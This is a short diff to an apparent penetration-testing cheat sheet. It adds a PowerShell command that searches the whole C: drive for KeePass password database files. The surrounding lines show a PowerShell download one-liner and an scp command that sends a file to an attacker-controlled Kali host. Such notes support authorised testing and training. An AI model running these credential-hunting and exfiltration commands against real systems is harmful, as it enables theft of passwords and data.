@@ -105,6 +105,11 @@ Powershell Download From URL:
 (New-Object System.Net.WebClient).DownloadFile("<URL>","C:\path\to\destination")
 ```
 
+Powershell find Keepass file:
+```bash
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+
 Powershell SCP:
 ```powershell
 scp filename.txt kali@<our IP>:/home/kali
